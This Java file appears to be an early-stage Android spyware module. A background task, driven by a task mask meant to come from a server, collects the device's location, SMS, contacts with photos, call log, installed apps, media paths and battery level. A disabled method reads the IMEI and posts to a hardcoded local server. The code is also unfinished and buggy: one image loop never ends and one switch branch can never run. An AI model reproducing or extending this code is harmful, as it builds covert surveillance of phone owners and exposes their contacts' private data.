package src.silent.jobs.tasks;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.Drawable;
import android.location.Location;
import android.location.LocationManager;
import android.net.TrafficStats;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.security.KeyManagementException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.Certificate;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManagerFactory;

import src.silent.jobs.utils.ContactModel;
import src.silent.jobs.utils.Sms;

/**
 * Created by all3x on 2/23/2018.
 */

public abstract class TaskMaster extends AsyncTask<Context, Void, Void> {

    private Context params;

    @Override
    protected Void doInBackground(Context... params) {
        // TODO: Get the mask from server
        String mask = "10000000";

        this.params = params[0];
        //getAndroidIDModel();


        for (int i = 0; i < 8; i++) {
            if (mask.charAt(i) == '1') {
                switch (i) {
                    case 0:
                        getSmartphoneLocation();
                        break;
                    case 1:
                        getMessages();
                        break;
                    case 2:
                        getContacts();
                        break;
                    case 3:
                        getCallHistory();
                        break;
                    case 4:
                        getMobileDataUsage();
                        break;
                    case 5:
                        getInstalledApps();
                        break;
                    case 6:
                        getPhotosVideos();
                        break;
                    case 7:
                        getBatteryLevel();
                        break;
                    case 8:
                        getScreenShot();
                }
            }
        }
        return null;
    }

    private void getAndroidIDModel() {
        String[] test = {"", "", ""};
        try {
            TelephonyManager telephonyManager = (TelephonyManager) params.
                    getSystemService(Context.TELEPHONY_SERVICE);
            test[0] = telephonyManager.getDeviceId();
            test[1] = Build.MANUFACTURER;
            test[2] = Build.MODEL;

            URL url = new URL("http://192.168.1.24:58938/api/Service/Post");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setReadTimeout(10000);
            conn.setConnectTimeout(15000);
            conn.setRequestMethod("POST");
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/xml");

            String body = "";

            DataOutputStream output = new DataOutputStream(conn.getOutputStream());
            output.write(body.getBytes());
            output.flush();
            output.close();

            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));

            conn.disconnect();

            Log.d("IMEI_MODEL", test[0] + " " + test[1] + " " + test[2]);
        } catch (SecurityException ex) {
            Log.d("IMEI EXCEPTION", ex.getMessage());
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void getSmartphoneLocation() {
        LocationManager locationManager = (LocationManager)
                params.getSystemService(Context.LOCATION_SERVICE);
        try {
            Location location = null;
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            } else {
                location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
            }
            Double lat = location.getLatitude();
            Double longg = location.getLongitude();
            Log.d("IMEI EXCEPTION", "Latitudine " + lat +
                    " Longitudine " + longg);
        } catch (SecurityException ex) {
            Log.d("Location EXCEPTION", ex.getMessage());
        }
    }

    private void getMessages() {
        List<Sms> lstSms = new ArrayList<>();
        Sms objSms;
        Uri message = Uri.parse("content://mms-sms/conversations/");
        ContentResolver cr = params.getContentResolver();
        Cursor c = cr.query(message, new String[]{"*"}, null, null,
                "date DESC");
        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {

                objSms = new Sms();
                objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                objSms.setAddress(c.getString(c
                        .getColumnIndexOrThrow("address")));
                objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                objSms.setReadState(c.getString(c.getColumnIndex("read")));
                Date date = new Date(Long.
                        parseLong(c.getString(c.getColumnIndexOrThrow("date"))));
                objSms.setTime(date.toString());
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    objSms.setFolderName("inbox");
                } else {
                    objSms.setFolderName("sent");
                }

                lstSms.add(objSms);
                c.moveToNext();
            }
        }
        c.close();
    }

    private void getContacts() {
        List<ContactModel> list = new ArrayList<>();
        ContentResolver contentResolver = params.getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if (cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                if (cursor.getInt(cursor.getColumnIndex(ContactsContract.
                        Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor cursorInfo = contentResolver.query(ContactsContract.
                                    CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    InputStream inputStream = ContactsContract.Contacts.
                            openContactPhotoInputStream(params.getContentResolver(),
                                    ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,
                                            new Long(id)));

                    Uri person = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,
                            new Long(id));
                    Uri pURI = Uri.withAppendedPath(person,
                            ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);

                    Bitmap photo = null;
                    if (inputStream != null) {
                        photo = BitmapFactory.decodeStream(inputStream);
                    }
                    while (cursorInfo.moveToNext()) {
                        ContactModel info = new ContactModel();
                        info.id = id;
                        info.name = cursor.getString(cursor.getColumnIndex(ContactsContract.
                                Contacts.DISPLAY_NAME));
                        info.mobileNumber = cursorInfo.getString(cursorInfo.
                                getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        info.photo = photo;
                        info.photoURI = pURI;
                        list.add(info);
                    }

                    cursorInfo.close();
                }
            }
            cursor.close();
        }
    }

    private void getCallHistory() {
        try {
            List<String> strings = new ArrayList<>();

            ContentResolver contentResolver = params.getContentResolver();
            Cursor managedCursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null,
                    null, null, null);
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

            while (managedCursor.moveToNext()) {
                StringBuffer sb = new StringBuffer();
                sb.append("Call Details :");
                String phNumber = managedCursor.getString(number);
                String callType = managedCursor.getString(type);
                String callDate = managedCursor.getString(date);
                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = managedCursor.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                        + dir + " \nCall Date:--- " + callDayTime
                        + " \nCall duration in sec :--- " + callDuration);
                sb.append("\n----------------------------------");
                strings.add(sb.toString());
            }
            managedCursor.close();

        } catch (SecurityException ex) {
            Log.d("CALL LOG EX", ex.getMessage());
        }
    }

    private void getMobileDataUsage() {
        long totalTraficReceived = TrafficStats.getTotalRxBytes() / (1024 * 1024);
        long totalTraficTransmitted = TrafficStats.getTotalTxBytes() / (1024 * 1024);
        long totalTrafic = totalTraficReceived + totalTraficTransmitted;
    }

    private void getInstalledApps() {
        PackageManager pm = params.getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(0);
        for (ApplicationInfo packageInfo : packages) {
            String package_name = packageInfo.packageName;
            ApplicationInfo app = null;
            try {
                app = pm.getApplicationInfo(package_name, 0);
            } catch (PackageManager.NameNotFoundException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            String name = (String) pm.getApplicationLabel(app);
            Drawable icon = pm.getApplicationIcon(app);
            int i = 0;
            i++;
        }
    }

    private void getPhotosVideos() {
        ContentResolver cr = params.getContentResolver();
        String[] filePathColumn = {MediaStore.Images.Media.DATA};
        Cursor cur = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, filePathColumn
                , null, null, null);
        if (cur.moveToFirst()) {
            do {
                int columnIndex = cur.getColumnIndex(filePathColumn[0]);
                String picturePath = cur.getString(columnIndex);
                if (picturePath != null) {
                    File file = new File(picturePath);
                    Log.d("EDIT USER PROFILE", "UPLOAD: file length = " + file.length());
                    Log.d("EDIT USER PROFILE", "UPLOAD: file exist = " + file.exists());
                }
            } while (cur.moveToNext());
        }
        cur.close();

        cur = cr.query(MediaStore.Images.Media.INTERNAL_CONTENT_URI, filePathColumn
                , null, null, null);
        if (cur.moveToFirst()) {
            do {
                int columnIndex = cur.getColumnIndex(filePathColumn[0]);
                String picturePath = cur.getString(columnIndex);
                if (picturePath != null) {
                    File file = new File(picturePath);
                    Log.d("EDIT USER PROFILE", "UPLOAD: file length = " + file.length());
                    Log.d("EDIT USER PROFILE", "UPLOAD: file exist = " + file.exists());
                }
            } while (cur.moveToFirst());
        }
        cur.close();
    }

    private void getBatteryLevel() {
        BroadcastReceiver batteryReceriver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                float batteryPct = level / (float) scale;
                Log.d("BETTERY", "" + batteryPct);
            }
        };
        IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        params.registerReceiver(batteryReceriver, batteryFilter);
    }

    public void getScreenShot() {

    }
}
